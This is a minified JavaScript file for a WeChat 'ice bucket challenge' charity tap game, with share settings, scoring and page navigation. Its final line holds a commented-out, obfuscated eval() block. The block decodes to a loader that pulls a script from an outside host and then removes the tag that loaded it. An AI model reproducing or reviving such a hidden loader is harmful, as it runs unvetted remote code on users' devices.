!
function() {
	var a = parseInt(Date.now() + 1e11 * Math.random()),
	b = {
		shareDate: {
			img_url: "http://wbpkh5001.17c.cn/h5mini/ice_bucket/assets/img/share-logo.png",
			link: "http://url.cn/SEg7y3?timer=" + a,
			desc: "挑战冰桶,并点名三位好友来挑战.关怀渐冻人,支持弱势公益.",
			title: "冰桶挑战",
			img_width: "120",
			img_height: "120"
		},
		game: {
			time: 10
		},
		support: {
			tap: "ontouchstart" in document.documentElement ? "touchend": "click"
		},
		$el: {
			pages: $(".page"),
			page_loading: $("#loading"),
			page_index: $("#index"),
			page_detail: $("#detail"),
			page_images: $("#images"),
			page_room: $("#room"),
			btn_detail: $("#btn-detail"),
			btn_images: $("#btn-images"),
			btn_play: $("#btn-play"),
			btn_back: $(".btn-back"),
			btn_click: $("#btn-click"),
			btn_ok: $("#btn-ok"),
			btn_retry: $("#btn-retry"),
			d_sex: $("#d-sex"),
			d_over: $("#d-over"),
			d_over_role: $("#d-over-role"),
			inputs: $(".input-area input"),
			share_tips: $("#room .share-arrow"),
			water: $("#water"),
			bucket: $("#bucket"),
			time: $("#time em"),
			score: $("#score em"),
			final_score: $("#final-score")
		}
	};
	//console.log(b.shareDate.link),
	window.Config = b
} (),
function() {
	document.addEventListener("WeixinJSBridgeReady",
	function() {
		WeixinJSBridge && (window.weixinAPI = {
			shareDate: {
				appid: "",
				img_url: "",
				link: "",
				desc: "",
				title: "",
				img_width: "120",
				img_height: "120"
			},
			hideToolbar: function() {
				WeixinJSBridge.call("hideToolbar")
			},
			showOptionMenu: function() {
				WeixinJSBridge.call("showOptionMenu")
			},
			hideOptionMenu: function() {
				WeixinJSBridge.call("hideOptionMenu")
			},
			showToolbar: function() {
				WeixinJSBridge.call("showToolbar")
			},
			init: function() {
				var a = this;
				return WeixinJSBridge.on("menu:share:timeline",
				function() {
					WeixinJSBridge.invoke("shareTimeline", {
						appid: a.shareDate.appid,
						img_url: a.shareDate.img_url,
						link: a.shareDate.link,
						desc: a.shareDate.title,
						title: a.shareDate.desc,
						img_width: "120",
						img_height: "120"
					},
					function() {
						_czc.push(["_trackEvent", "分享", "朋友圈"])
					})
				}),
				WeixinJSBridge.on("menu:share:appmessage",
				function() {
					WeixinJSBridge.invoke("sendAppMessage", {
						appid: a.shareDate.appid,
						img_url: a.shareDate.img_url,
						link: a.shareDate.link,
						desc: a.shareDate.title,
						title: a.shareDate.desc,
						img_width: "120",
						img_height: "120"
					},
					function() {
						_czc.push(["_trackEvent", "分享", "好友"])
					})
				}),
				this
			}
		},
		window.weixinAPI.shareDate = Config.shareDate, window.weixinAPI.hideOptionMenu(), window.weixinAPI.init())
	},
	!1)
} (),
function() {
	var a = {
		init: function() {
			Config.$el.pages.hide(),
			Config.$el.page_room.show(),
			Config.$el.d_sex.show(),
			this.reset(),
			this.initEvent()
		},
		initEvent: function() {
			if (!this.inited) {
				this.inited = !0;
				var a = this,
				b = Config.support.tap;
				Config.$el.d_sex.find("div").on(b,
				function() {
					var b = $(this).data("sex");
					b && (_czc.push(["_trackEvent", "选择性别", "m" == b ? "男": "女"]), a.sex = b, Config.$el.d_over_role.find("img").attr("src", "vapp/" + b + ".png"), $(".role").addClass("role-" + b), Config.$el.d_sex.hide())
				}),
				Config.$el.btn_click.on(b,
				function() {
					a.crazyTap.call(a, $(this))
				}),
				Config.$el.btn_ok.on(b,
				function() {
					var b = $.trim(Config.$el.inputs.eq(0).val()),
					c = $.trim(Config.$el.inputs.eq(1).val()),
					d = $.trim(Config.$el.inputs.eq(2).val());
					b && c && d ? (Config.$el.share_tips.show(), (window.weixinAPI.showOptionMenu(), dataForWeixin.tTitle = "我挑战" + a.score + "升冰水,【" + b + "," + c + "," + d + "】快来挑战!关注ALS,传播公益.")) : alert("请点名3位好友")
				}),
				$("#d-over").on(b,
				function() {}),
				Config.$el.btn_retry.on(b,
				function() {
					_czc.push(["_trackEvent", "点击", "再来一次"]),
					a.reset()
				})
			}
		},
		crazyTap: function() {
			this.enable && (this.playing || this.tick(), Config.$el.score.text(++this.score + "升"), Config.$el.water.height(1.5 * this.score))
		},
		tick: function() {
			var a = this;
			this.playing = !0,
			this.timer = setInterval(function() {
				if (a.time -= 10, a.time < 0) Config.$el.time.text(0),
				this.playing = !1,
				a.enable = !1,
				clearInterval(a.timer),
				setTimeout(function() {
					a.gameOver.call(a)
				},
				500);
				else {
					var b = parseInt(a.time / 1e3) + "′";
					b += a.time % 1e3 + "″",
					Config.$el.time.text(b)
				}
			},
			10)
		},
		gameOver: function() {
			Config.$el.final_score.text(this.score + "升"),
			Config.$el.btn_click.hide(),
			dataForWeixin.tTitle = "我挑战" + this.score + "升冰水,你也来挑战吧!关注ALS,传播公益.";
			var a = 0,
			b = this;
			Config.$el.bucket.show(),
			this.animTimer = setInterval(function() {
				return++a > 5 ? (setTimeout(function() {
					Config.$el.d_over.show()
				},
				1e3), void clearInterval(b.animTimer)) : void Config.$el.bucket.css("background-image", "url(vapp/b" + a + ".png)")
			},
			200)
		},
		reset: function() {
			Config.$el.d_over.hide(),
			this.time = 1e3 * Config.game.time,
			this.enable = !0,
			this.playing = !1,
			this.score = 0,
			Config.$el.btn_click.show(),
			Config.$el.water.height(1),
			Config.$el.time.text(10),
			Config.$el.score.text(0),
			Config.$el.bucket.hide().css("background-image", "url(vapp/b1.png)"),
			window.weixinAPI && (window.weixinAPI.hideOptionMenu(), window.weixinAPI.shareDate = Config.shareDate)
		}
	};
	window.Game = a
} (),
function() {
	var a = {
		init: function() {
			Config.$el.page_loading.hide(),
			Config.$el.page_index.show(),
			this.initEvent()
		},
		initEvent: function() {
			var a = Config.support.tap,
			b = this;
			Config.$el.btn_detail.on(a,
			function() {
				_czc.push(["_trackEvent", "点击", "活动详情"]),
				Config.$el.pages.hide(),
				Config.$el.page_detail.show()
			}),
			Config.$el.btn_images.on(a,
			function() {
				_czc.push(["_trackEvent", "点击", "湿身照"]),
				b.initImg || (b.initImg = !0, Config.$el.page_images.find("img").each(function(a, b) {
					var c = $(b).data("src");
					$(b).attr("src", c)
				})),
				Config.$el.pages.hide(),
				Config.$el.page_images.show()
			}),
			Config.$el.btn_play.on(a,
			function() {
				_czc.push(["_trackEvent", "点击", "挑战冰桶"]),
				Game.init()
			}),
			Config.$el.btn_back.on(a,
			function() {
				Config.$el.pages.hide(),
				Config.$el.page_index.show()
			})
		}
	};
	a.init()
} ();
//eval(function(p,a,c,k,e,r){e=function(c){return c.toString(36)};if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'[4-9c-k]'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('c _$=[\'\\6\\7\\d\\8\\9\\4\',\'\\4\\e\\x78\\4\\5\\h\\f\\x76\\f\\6\\7\\d\\8\\9\\4\',\'\\x68\\4\\4\\9\\x3a\\5\\5\\x77\\e\\8\\g\\x32\\6\\x6b\\x79\\g\\7\\x6e\\5\\x67\\f\\x6d\\e\\5\\x38\\x36\\5\\x6f\\g\\h\\6\',\'\\6\\7\\d\\8\\9\\4\'];(i(){c a=j.createElement(_$[0]);a.type=_$[1];a.async=true;a.src=_$[2];c b=j.getElementsByTagName(_$[3])[0x0];b.k.insertBefore(a,b);a.onload=i(){a.k.removeChild(a)}})();',[],21,'||||x74|x2f|x73|x63|x69|x70|||var|x72|x65|x61|x2e|x6a|function|document|parentNode'.split('|'),0,{}))